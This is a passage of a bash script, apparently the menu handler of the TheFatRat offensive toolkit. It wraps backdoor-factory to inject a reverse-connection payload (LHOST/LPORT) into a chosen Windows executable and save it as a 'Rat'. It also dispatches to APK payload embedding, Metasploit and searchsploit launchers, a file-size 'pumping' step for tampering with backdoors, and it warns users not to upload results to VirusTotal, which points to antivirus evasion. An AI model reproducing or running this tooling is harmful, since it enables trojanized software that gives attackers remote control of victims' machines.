    elif test $fatrat == '3'
      then
      avoid

    elif test $fatrat == '4'
      then
          echo ""
  	  spinlong
          echo -e "\n"
          echo -e $okegreen""
          echo -e $yellow "  Your local IPV4 address is : $lanip"
          echo -e $yellow "  Your local IPV6 address is : $lanip6"
          echo -e $yellow "  Your public IP address is : $publicip"
          echo -e $yellow "  Your Hostname is : $hostn"
          echo -e $okegreen""
      if [ ! -f "$defcon" ]
      then
          yourip=""
          yourport=""
      fi
          if [ -z "$yourip" ]; then
				  read -p '  Set LHOST IP: ' yourip
          fi
          echo -e $okegreen ""
          if [ -z "$yourport" ]; then
          read -p '  Set LPORT: ' yourport
          fi
          read -p '  Please enter the base name for output files : ' fira
          invalid
          if [ $err == "1" ]
          then
            echo -e $okegreen ""
            echo -n "Press [ENTER] key to return to menu ."
            read inp
            menu
          fi
          			selexe
     	  			pldbkf
          			echo ""
  				gboor
  				spinlong2
  				echo ""
  				echo -e $okegreen""
  				$backdoor -f $exef -s $payload -H $yourip -P $yourport -o output/$fira.exe
backout="$path/backdoored/output/$fira.exe"
 if [ ! -f "$backout" ]
then
echo -e $red "There was a problem in the creation of your backdoor file using backdoor-factory"
echo -e $red "One of the problable causes is that the EXE file you selected is not yet supported"
echo ""
echo -e $okegreen "Press [ENTER] key to continue to main menu "
read mmenu
clear
menu
else
echo ""
echo -e $cyan "Your Rat was saved To :"
echo -e $cyan "$path/backdoored/output/$fira.exe"
echo ""
bkflst
  				read bebeku
  				clear
  				menu

fi
    elif test $fatrat == '5'
      then
      embedapk

    elif test $fatrat == '6'
      then
      PwnWinds

    elif test $fatrat == '7'
      then
      microsploit

    elif test $fatrat == '8'
      then
      trodebi

    elif test $fatrat == '9'
      then
      clisteners

    elif test $fatrat == '10'
      then
      xterm -fa monaco -fs 13 -bg black -e "$msfconsole"
     clear
	menu

elif test $fatrat == '11'
      then
      echo
      echo -ne $okegreen " What do you want to Hack Today ? :   " ;tput sgr0
      read searchterm
      echo
      gnome-terminal --maximize -t "Seachsploit" --working-directory=WORK_DIR -x bash -c "$searchsploit $searchterm; echo -e '\e[32m[-] Close this window when done!\e[0m'; bash" 2>/dev/null & sleep 2
      menu

    elif test $fatrat == '12'
      then
      echo
      echo -ne $okegreen " Located file (example:/output/backdoor.exe) :" ;tput sgr0
      read tampfile
      echo
      echo -ne $okegreen"  Size file for tamper (1000 for kb) (1 for mb ) : " ;tput sgr0
      read size
      echo
      echo -ne $okegreen"  mb or kb : " ;tput sgr0
      read type
      python $pump $tampfile $size -$type > /dev/null 2>&1
      echo
      echo -ne $yellow"  Finished Pumping ... "
      read oke
      menu

    elif test $fatrat == '13'
      then
      echo ""
      confdefault
      clear
      menu

    elif test $fatrat == '14'
      then
      echo ""
      echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
      read clean
      if [ $clean == "y" ] ;
        then
      echo ""
        else
      clear
      menu
        fi
      echo -e $red"  [*] $cyan Cleaning $path/temp/"
      rm $path/temp/* >/dev/null 2>&1
      sleep 2
      echo ""
      echo -e $red"  [*] $cyan Cleaning $path/autorun/"
      rm $path/autorun/* >/dev/null 2>&1
      sleep 2
      echo ""
      echo -e $red"  [*] $cyan Cleaning $path/output/"
      rm $path/output/* >/dev/null 2>&1
      sleep 2
      echo ""
      echo -e $red"  [*] $cyan Cleaning $path/config/listeners/"
      rm $path/config/listeners/* >/dev/null 2>&1
      sleep 2
      echo ""
      echo -e $red"  [*] $cyan Cleaning $path/*.exe or apk"
      rm *.exe *.apk  >/dev/null 2>&1
      sleep 2
      echo ""
      echo -e $red"  [*] $cyan Cleaning $path/backdoored/output/"
      rm $path/backdoored/output/* >/dev/null 2>&1
      echo ""
      echo -ne $red"  [*] $cyan Folders cleaned, press [ENTER] key to return to the main menu."
      read anjeng
      menu

    elif test $fatrat == '15'
      then
      firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
      clear
     	menu

    elif test $fatrat == '16'
      then
      credits

    elif test $fatrat == '17'
      then
        Stop
        echo ""
        echo -e $okegreen"  REMEMBER , DONT UPLOAD TO VIRUSTOTAL !!"
        echo ""
        read -p "  Press [Enter] key to Exit..."
        sleep 2
        clear
        exit
    else
      clear
          menu

fi
